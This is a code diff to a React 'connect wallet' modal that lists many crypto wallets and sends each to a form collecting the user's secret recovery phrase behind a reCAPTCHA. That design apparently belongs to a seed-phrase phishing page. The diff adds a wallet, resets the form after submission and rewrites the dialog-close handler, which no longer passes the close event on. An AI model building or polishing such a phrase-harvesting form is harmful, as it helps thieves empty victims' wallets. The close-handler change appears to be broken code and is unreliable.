@@ -33,6 +33,7 @@ const wallets = [
     { name: "Trust Wallet", logo: "https://placehold.co/64x64.png", hint: "shield logo" },
     { name: "Phantom", logo: "https://placehold.co/64x64.png", hint: "ghost logo" },
     { name: "Coinbase Wallet", logo: "https://placehold.co/64x64.png", hint: "blue square" },
+    { name: "Tonkeeper", logo: "https://placehold.co/64x64.png", hint: "blue diamond" },
     { name: "Ledger", logo: "https://placehold.co/64x64.png", hint: "sleek usb" },
     { name: "Trezor", logo: "https://placehold.co/64x64.png", hint: "black device" },
     { name: "Exodus", logo: "https://placehold.co/64x64.png", hint: "X logo" },
@@ -58,7 +59,6 @@ const wallets = [
     { name: "Enkrypt", logo: "https://placehold.co/64x64.png", hint: "E shield" },
     { name: "XDEFI Wallet", logo: "https://placehold.co/64x64.png", hint: "X logo" },
     { name: "Keplr", logo: "https://placehold.co/64x64.png", hint: "K logo" },
-    { name: "Cosmostation", logo: "https://placehold.co/64x64.png", hint: "atom C" },
 ];
 
 
@@ -142,6 +142,7 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
       });
     } finally {
         recaptchaRef.current?.reset();
+        form.reset();
     }
   };
 
@@ -213,7 +214,7 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
                   <ReCAPTCHA
                     ref={recaptchaRef}
                     sitekey="6LeIxAcpAAAAAMu-pOKNn9mESaK5X2j_0P0u_XhP" // This is a public test key
-                    onChange={field.onChange}
+                    onChange={(token) => field.onChange(token || "")}
                     theme="dark"
                   />
                 </FormControl>
@@ -253,6 +254,17 @@ export function WalletConnectModal({ isOpen, onOpenChange }) {
     setView("wallets");
     setSelectedWallet(null);
   };
+  
+  const handleClose = (open) => {
+    if (!open) {
+      const timer = setTimeout(() => {
+        setView("wallets");
+        setSelectedWallet(null);
+      }, 300); // Wait for close animation
+      return () => clearTimeout(timer);
+    }
+    onOpenChange(open);
+  }
 
   React.useEffect(() => {
     if (!isOpen) {
@@ -265,7 +277,7 @@ export function WalletConnectModal({ isOpen, onOpenChange }) {
   }, [isOpen]);
 
   return (
-    <Dialog open={isOpen} onOpenChange={onOpenChange}>
+    <Dialog open={isOpen} onOpenChange={handleClose}>
       <DialogContent className="sm:max-w-[480px]">
         {view === "wallets" ? (
           <>
